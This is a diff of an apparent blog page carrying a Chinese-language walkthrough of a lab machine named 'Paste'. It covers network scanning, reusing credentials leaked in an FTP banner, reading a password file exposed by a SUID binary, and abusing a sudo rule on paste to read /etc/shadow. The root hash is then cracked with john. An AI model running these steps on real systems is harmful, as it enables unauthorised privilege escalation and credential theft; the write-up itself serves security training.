@@ -22,7 +22,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Paste.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Paste</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -46,17 +46,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -90,8 +80,8 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h2>一、信息收集</h2>
 <h3>1. 主机发现</h3>
-<p>首先，在内网环境中，我们使用 <code class="notranslate">arp-scan</code> 工具扫描本地网络，以发现存活的主机。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>首先，在内网环境中，我们使用 <code>arp-scan</code> 工具扫描本地网络，以发现存活的主机。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -99,138 +89,153 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
 192.168.205.193 08:00:27:6a:e7:aa       PCS Systemtechnik GmbH
 192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
-...</pre></div>
-<p>扫描结果显示目标主机的 IP 地址为 <code class="notranslate">192.168.205.193</code>。</p>
+...
+</code></pre>
+<p>扫描结果显示目标主机的 IP 地址为 <code>192.168.205.193</code>。</p>
 <h3>2. 端口与服务扫描</h3>
-<p>确定目标 IP 后，使用 <code class="notranslate">nmap</code> 对其进行端口扫描，探测其开放的端口和服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>确定目标 IP 后，使用 <code>nmap</code> 对其进行端口扫描，探测其开放的端口和服务。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p- 192.168.205.193
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 23:24 EDT
-Nmap scan report <span class="pl-k">for</span> 192.168.205.193
+Nmap scan report for 192.168.205.193
 Host is up (0.00018s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT   STATE SERVICE
 21/tcp open  ftp
 22/tcp open  ssh
-80/tcp open  http</pre></div>
+80/tcp open  http
+</code></pre>
 <p>扫描发现目标开放了三个常见服务端口：FTP (21), SSH (22) 和 HTTP (80)。</p>
 <h2>二、初始访问</h2>
 <h3>1. FTP 信息泄露</h3>
 <p>我们首先尝试访问 FTP 服务，查看是否存在匿名访问或敏感信息。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ftp 192.168.205.193                                                                                                                     
 Connected to 192.168.205.193.
-220 220 Welcome to FTP Service Please use guest:guest to login</pre></div>
-<p>FTP 服务的欢迎信息直接泄露了一组登录凭据：<code class="notranslate">guest:guest</code>。我们使用该凭据登录。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">Name (192.168.205.193:kali): guest
+220 220 Welcome to FTP Service Please use guest:guest to login
+</code></pre>
+<p>FTP 服务的欢迎信息直接泄露了一组登录凭据：<code>guest:guest</code>。我们使用该凭据登录。</p>
+<pre lang="bash"><code>Name (192.168.205.193:kali): guest
 331 Please specify the password.
 Password: 
 230 Login successful.
-Remote system <span class="pl-c1">type</span> is UNIX.
+Remote system type is UNIX.
 ...
-ftp<span class="pl-k">&gt;</span> ls -la
+ftp&gt; ls -la
 ...
-dr-xr-xr-x    2 1001     1001         4096 Jul 13 05:12 <span class="pl-c1">.</span>
+dr-xr-xr-x    2 1001     1001         4096 Jul 13 05:12 .
 ...
-ftp<span class="pl-k">&gt;</span> mkdir <span class="pl-c1">test</span>
-550 Permission denied.</pre></div>
-<p>虽然成功登录，但 <code class="notranslate">guest</code> 用户权限极低，无法上传或创建任何文件。</p>
+ftp&gt; mkdir test
+550 Permission denied.
+</code></pre>
+<p>虽然成功登录，但 <code>guest</code> 用户权限极低，无法上传或创建任何文件。</p>
 <h3>2. SSH 登录</h3>
-<p>考虑到 FTP 和 SSH 服务同时开放，我们推测 <code class="notranslate">guest:guest</code> 这组凭据可能同样适用于 SSH 服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>考虑到 FTP 和 SSH 服务同时开放，我们推测 <code>guest:guest</code> 这组凭据可能同样适用于 SSH 服务。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh guest@192.168.205.193
-guest@192.168.205.193<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
-<span class="pl-s">...</span>
-<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
-<span class="pl-s">permitted by applicable law.</span>
-<span class="pl-s">Last login: Thu Jul 17 23:32:23 2025 from 192.168.205.128</span>
-<span class="pl-s">guest@Paste:~$ id</span>
-<span class="pl-s">uid=1001(guest) gid=1001(guest) groups=1001(guest)</span></pre></div>
+guest@192.168.205.193's password: 
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jul 17 23:32:23 2025 from 192.168.205.128
+guest@Paste:~$ id
+uid=1001(guest) gid=1001(guest) groups=1001(guest)
+</code></pre>
 <p>尝试成功，我们通过 SSH 获得了目标系统的一个低权限 Shell。</p>
 <h2>三、权限提升</h2>
-<h3>1. 提权至 <code class="notranslate">film</code> 用户</h3>
+<h3>1. 提权至 <code>film</code> 用户</h3>
 <p>获得初始访问权限后，我们开始在系统中寻找提权的机会。首先，我们查找具有 SUID 权限位的特殊文件。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
+<pre lang="bash"><code>guest@Paste:~$ find / -perm -4000 -type f 2&gt;/dev/null
 /usr/bin/chsh
 ...
 /usr/bin/sudo
 /usr/bin/passwd
 /usr/local/bin/change
-...</pre></div>
-<p>在结果中，<code class="notranslate">/usr/local/bin/change</code> 这个不寻常的 SUID 文件引起了我们的注意。我们使用 <code class="notranslate">strings</code> 命令来分析该二进制文件的内容，寻找线索。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:/opt$ strings /usr/local/bin/change
+...
+</code></pre>
+<p>在结果中，<code>/usr/local/bin/change</code> 这个不寻常的 SUID 文件引起了我们的注意。我们使用 <code>strings</code> 命令来分析该二进制文件的内容，寻找线索。</p>
+<pre lang="bash"><code>guest@Paste:/opt$ strings /usr/local/bin/change
 ...
 /var/www/html/password.log
 Failed to open password file
 ...
 chpasswd
-Failed to execute chpasswd <span class="pl-c1">command</span>
+Failed to execute chpasswd command
 film
 %s:%s
-Password <span class="pl-k">for</span> %s successfully changed
-...</pre></div>
-<p>从 <code class="notranslate">strings</code> 的输出中，我们得到了几个关键信息：</p>
+Password for %s successfully changed
+...
+</code></pre>
+<p>从 <code>strings</code> 的输出中，我们得到了几个关键信息：</p>
 <ul>
-<li>程序会读取 <code class="notranslate">/var/www/html/password.log</code> 文件。</li>
-<li>程序会调用 <code class="notranslate">chpasswd</code> 命令。</li>
-<li>程序中硬编码了用户名 <code class="notranslate">film</code>。</li>
+<li>程序会读取 <code>/var/www/html/password.log</code> 文件。</li>
+<li>程序会调用 <code>chpasswd</code> 命令。</li>
+<li>程序中硬编码了用户名 <code>film</code>。</li>
 </ul>
-<p>基于以上线索，我们推断：这个程序的功能是读取 <code class="notranslate">/var/www/html/password.log</code> 文件的内容，并将其设置为 <code class="notranslate">film</code> 用户的密码。</p>
+<p>基于以上线索，我们推断：这个程序的功能是读取 <code>/var/www/html/password.log</code> 文件的内容，并将其设置为 <code>film</code> 用户的密码。</p>
 <p>于是，我们直接查看该日志文件的内容：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:/opt$ cat /var/www/html/password.log
-42956292</pre></div>
-<p>我们得到了 <code class="notranslate">film</code> 用户的密码 <code class="notranslate">42956292</code>。现在，我们切换到 <code class="notranslate">film</code> 用户。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:/opt$ su film
+<pre lang="bash"><code>guest@Paste:/opt$ cat /var/www/html/password.log
+42956292
+</code></pre>
+<p>我们得到了 <code>film</code> 用户的密码 <code>42956292</code>。现在，我们切换到 <code>film</code> 用户。</p>
+<pre lang="bash"><code>guest@Paste:/opt$ su film
 Password: 
 film@Paste:/opt$ id
-uid=1002(film) gid=1002(film) groups=1002(film)</pre></div>
-<p>成功提权至 <code class="notranslate">film</code> 用户。</p>
-<h3>2. 提权至 <code class="notranslate">root</code></h3>
-<p>成为 <code class="notranslate">film</code> 用户后，我们检查其 <code class="notranslate">sudo</code> 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">film@Paste:/opt$ sudo -l
+uid=1002(film) gid=1002(film) groups=1002(film)
+</code></pre>
+<p>成功提权至 <code>film</code> 用户。</p>
+<h3>2. 提权至 <code>root</code></h3>
+<p>成为 <code>film</code> 用户后，我们检查其 <code>sudo</code> 权限。</p>
+<pre lang="bash"><code>film@Paste:/opt$ sudo -l
 ...
 User film may run the following commands on Paste:
-    (ALL) NOPASSWD: /usr/bin/paste</pre></div>
-<p>结果显示，<code class="notranslate">film</code> 用户可以无需密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/usr/bin/paste</code> 命令。<code class="notranslate">paste</code> 命令通常用于合并文件行，但如果指定一个文件作为参数，它会直接输出该文件的内容。我们可以利用这一点来读取系统上的任意文件。</p>
+    (ALL) NOPASSWD: /usr/bin/paste
+</code></pre>
+<p>结果显示，<code>film</code> 用户可以无需密码以 <code>root</code> 权限执行 <code>/usr/bin/paste</code> 命令。<code>paste</code> 命令通常用于合并文件行，但如果指定一个文件作为参数，它会直接输出该文件的内容。我们可以利用这一点来读取系统上的任意文件。</p>
 <p><strong>直接读取 root flag:</strong></p>
-<pre class="notranslate"><code class="notranslate">film@Paste:/opt$ sudo /usr/bin/paste /root/root.txt
+<pre><code>film@Paste:/opt$ sudo /usr/bin/paste /root/root.txt
 flag{root-6ab2177cfaffa72807624d043ecb6c13}
 </code></pre>
-<p>我们成功读取了 <code class="notranslate">root.txt</code>。为了获得一个完整的 <code class="notranslate">root</code> shell，我们可以进一步利用这个漏洞。</p>
+<p>我们成功读取了 <code>root.txt</code>。为了获得一个完整的 <code>root</code> shell，我们可以进一步利用这个漏洞。</p>
 <p><strong>获取 Root Shell:</strong></p>
 <ol>
 <li>
-<p>利用 <code class="notranslate">paste</code> 读取 <code class="notranslate">/etc/shadow</code> 文件，获取 <code class="notranslate">root</code> 用户的密码哈希。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">film@Paste:/opt$ sudo /usr/bin/paste /etc/shadow
-root:<span class="pl-smi">$6</span><span class="pl-smi">$jJev7FIbmMhP8iVA$p1</span>.bGLOCx5BsAzgCrbp/FgF56k6HXP0QFb5pCaZzAJ1N7qOhZjTJymyk9CMRbc8JGy5DXFl/BiwP9JEZ7o7mp0:20282:0:99999:7:::
-...</pre></div>
+<p>利用 <code>paste</code> 读取 <code>/etc/shadow</code> 文件，获取 <code>root</code> 用户的密码哈希。</p>
+<pre lang="bash"><code>film@Paste:/opt$ sudo /usr/bin/paste /etc/shadow
+root:$6$jJev7FIbmMhP8iVA$p1.bGLOCx5BsAzgCrbp/FgF56k6HXP0QFb5pCaZzAJ1N7qOhZjTJymyk9CMRbc8JGy5DXFl/BiwP9JEZ7o7mp0:20282:0:99999:7:::
+...
+</code></pre>
 </li>
 <li>
-<p>在我们的攻击机上，使用 <code class="notranslate">john</code> 和 <code class="notranslate">rockyou.txt</code> 字典来破解这个哈希。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>
+<p>在我们的攻击机上，使用 <code>john</code> 和 <code>rockyou.txt</code> 字典来破解这个哈希。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ...
-sexybitch<span class="pl-k">!</span>       (root)     
+sexybitch!       (root)     
 ...
-Session completed. </pre></div>
-<p>我们成功破解出 <code class="notranslate">root</code> 用户的密码为 <code class="notranslate">sexybitch!</code>。</p>
+Session completed. 
+</code></pre>
+<p>我们成功破解出 <code>root</code> 用户的密码为 <code>sexybitch!</code>。</p>
 </li>
 <li>
-<p>使用该密码切换到 <code class="notranslate">root</code> 用户。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">film@Paste:/opt$ su -
+<p>使用该密码切换到 <code>root</code> 用户。</p>
+<pre lang="bash"><code>film@Paste:/opt$ su -
 Password: 
-root@Paste:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
+root@Paste:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
 </li>
 </ol>
-<p>至此，我们获得了完整的 <code class="notranslate">root</code> 权限。</p>
+<p>至此，我们获得了完整的 <code>root</code> 权限。</p>
 <h3>3. 获取所有 Flag</h3>
 <p>最后，我们收集所有的 flag。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Paste:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
+<pre lang="bash"><code>root@Paste:~# cat /root/root.txt
 flag{root-6ab2177cfaffa72807624d043ecb6c13}
 
-root@Paste:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/film/user.txt</span>
-flag{user-f307bc02d0f7e60e52d128a0c27b8e34}<span class="pl-s"><span class="pl-pds">`</span><span class="pl-pds">`</span><span class="pl-pds">`</span></span></pre></div></div>
+root@Paste:~# cat /home/film/user.txt
+flag{user-f307bc02d0f7e60e52d128a0c27b8e34}```
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -255,7 +260,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -302,70 +307,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
